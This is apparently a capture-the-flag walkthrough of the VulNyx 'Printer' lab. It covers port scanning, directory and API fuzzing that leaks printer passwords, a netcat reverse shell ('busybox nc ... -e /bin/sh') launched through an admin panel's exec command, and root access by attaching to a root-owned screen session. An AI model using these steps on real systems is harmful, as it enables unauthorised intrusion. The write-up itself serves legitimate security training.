# VulNyx - Printer

## Information

## Solution

### Enumeration
#### Nmap Discovery
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.30
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-27 21:20 +07
Nmap scan report for 10.11.5.30
Host is up (0.014s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Konica Minolta Printer Admin Panel
|     Password:
|   NULL: 
|_    Konica Minolta Printer Admin Panel
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.95%I=7%D=5/27%Time=6A16FDB1%P=x86_64-pc-linux-gnu%r(NU
SF:LL,25,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\n")%r(GetRequ
SF:est,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x
SF:20")%r(HTTPOptions,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel
SF:\n\nPassword:\x20")%r(FourOhFourRequest,2F,"\nKonica\x20Minolta\x20Prin
SF:ter\x20Admin\x20Panel\n\nPassword:\x20")%r(JavaRMI,2F,"\nKonica\x20Mino
SF:lta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(GenericLines,2F,"
SF:\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(R
SF:TSPRequest,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPass
SF:word:\x20")%r(RPCCheck,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20P
SF:anel\n\nPassword:\x20")%r(DNSVersionBindReqTCP,2F,"\nKonica\x20Minolta\
SF:x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(DNSStatusRequestTCP,2
SF:F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%
SF:r(Help,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword
SF::\x20")%r(SSLSessionReq,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20
SF:Panel\n\nPassword:\x20")%r(TerminalServerCookie,2F,"\nKonica\x20Minolta
SF:\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(TLSSessionReq,2F,"\n
SF:Konica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(Ker
SF:beros,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:
SF:\x20")%r(SMBProgNeg,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Pane
SF:l\n\nPassword:\x20")%r(X11Probe,2F,"\nKonica\x20Minolta\x20Printer\x20A
SF:dmin\x20Panel\n\nPassword:\x20")%r(LPDString,2F,"\nKonica\x20Minolta\x2
SF:0Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(LDAPSearchReq,2F,"\nKon
SF:ica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(LDAPBi
SF:ndReq,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:
SF:\x20")%r(SIPOptions,2F,"\nKonica\x20Minolta\x20Printer\x20Admin\x20Pane
SF:l\n\nPassword:\x20")%r(LANDesk-RC,2F,"\nKonica\x20Minolta\x20Printer\x2
SF:0Admin\x20Panel\n\nPassword:\x20")%r(TerminalServer,2F,"\nKonica\x20Min
SF:olta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20")%r(NCP,2F,"\nKonica
SF:\x20Minolta\x20Printer\x20Admin\x20Panel\n\nPassword:\x20");
MAC Address: 08:00:27:1A:A0:47 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 179.67 seconds

```
#### Directory Enumeration
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ feroxbuster -u http://10.11.5.30/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.11.5.30/
 🚩  In-Scope Url          │ 10.11.5.30
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       24l      126w    10357c http://10.11.5.30/icons/openlogo-75.png
200      GET      368l      933w    10701c http://10.11.5.30/
301      GET        9l       28w      306c http://10.11.5.30/api => http://10.11.5.30/api/
301      GET        9l       28w      315c http://10.11.5.30/api/printers => http://10.11.5.30/api/printers/
[####################] - 7m    661646/661646  0s      found:4       errors:0      
[####################] - 7m    220545/220545  494/s   http://10.11.5.30/ 
[####################] - 7m    220545/220545  498/s   http://10.11.5.30/api/ 
[####################] - 7m    220545/220545  501/s   http://10.11.5.30/api/printers/
```
![web](/walkthroughs/vulnyx/easy_difficulty/06_printer/web.png)
![web-api]/walkthroughs/vulnyx/easy_difficulty/06_printer/web-api.png)
![web-printers](/walkthroughs/vulnyx/easy_difficulty/06_printer/web-printers.png)

#### ID & Extension Brute-force
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ wfuzz -c --hc=404 -z range,1-5000 -z list,json-yml-xml -u "http://10.11.5.30/api/printers/printerFUZZ.FUZ2Z" 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.11.5.30/api/printers/printerFUZZ.FUZ2Z
Total requests: 15000

=====================================================================
ID           Response   Lines    Word       Chars       Payload              
=====================================================================

000000001:   200        6 L      9 W        82 Ch       "1 - json"           
000000007:   200        6 L      9 W        79 Ch       "3 - json"           
000000013:   200        6 L      9 W        77 Ch       "5 - json"           
000000004:   200        6 L      9 W        80 Ch       "2 - json"           
000000010:   200        6 L      9 W        78 Ch       "4 - json"           
000004795:   200        6 L      9 W        97 Ch       "1599 - json"        

Total time: 50.83382
Processed Requests: 15000
Filtered Requests: 14994
Requests/sec.: 295.0791
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ for i in 1 2 3 4 5 1599; do curl -sX GET "http://10.11.5.30/api/printers/printer$i.json" ; done
{
  "printer": {
    "printer_id": "1",
    "printer_password": "P4ssw0rd!"
  }
}
{
  "printer": {
    "printer_id": "2",
    "printer_password": "iloveme"
  }
}
{
  "printer": {
    "printer_id": "3",
    "printer_password": "qwerty"
  }
}
{
  "printer": {
    "printer_id": "4",
    "printer_password": "admin"
  }
}
{
  "printer": {
    "printer_id": "5",
    "printer_password": "root"
  }
}
{
  "printer": {
    "printer_id": "1599",
    "printer_password": "$3cUr3Pr1nT3RP4ZZw0rD"
  }
}
```

### Initial Access
#### Reverse Shell (printer)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -vn 10.11.5.30 9999      
(UNKNOWN) [10.11.5.30] 9999 (?) open

Konica Minolta Printer Admin Panel


Password: $3cUr3Pr1nT3RP4ZZw0rD

Please type "?" for HELP
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
>
```
**Reverse shell**
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444            
listening on [any] 4444 ...
```

```bash
...
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session
> exec busybox nc 10.11.5.4 4444 -e /bin/sh
```
We have shell of `printer`.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444            
listening on [any] 4444 ...
connect to [10.11.5.4] from (UNKNOWN) [10.11.5.30] 42876
id ;hostname
uid=1000(printer) gid=1000(printer) grupos=1000(printer)
printer
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
printer@printer:/var/spool/lpd$
```

### Privilege Escalation
#### Enumeration
```bash
printer@printer:/home$ sudo -l
bash: sudo: orden no encontrada
printer@printer:/home$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
printer@printer:/home$ ls -l /usr/bin/screen
-rwsr-xr-x 1 root root 482312 feb 27  2021 /usr/bin/screen
```

#### Abuse
##### Process
```bash
printer@printer:/home$ ps aux | grep "screen"
root         326  0.0  0.0   2484   564 ?        Ss   16:15   0:00 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
printer   138230  0.0  0.0   6252   636 pts/1    S+   17:04   0:00 grep screen
```

```bash
printer@printer:~$ screen -x root/
root@printer:~# id;hostname
uid=0(root) gid=0(root) grupos=0(root)
printer
```

#### Flags
```bash
root@printer:~# find / -name root.txt -o -name user.txt 2>/dev/null | xargs cat
616e894462fed90fec26f828a0a6c50e
7cc698fe83419af87e0a504eb91913e2
```

***You are welcome!***
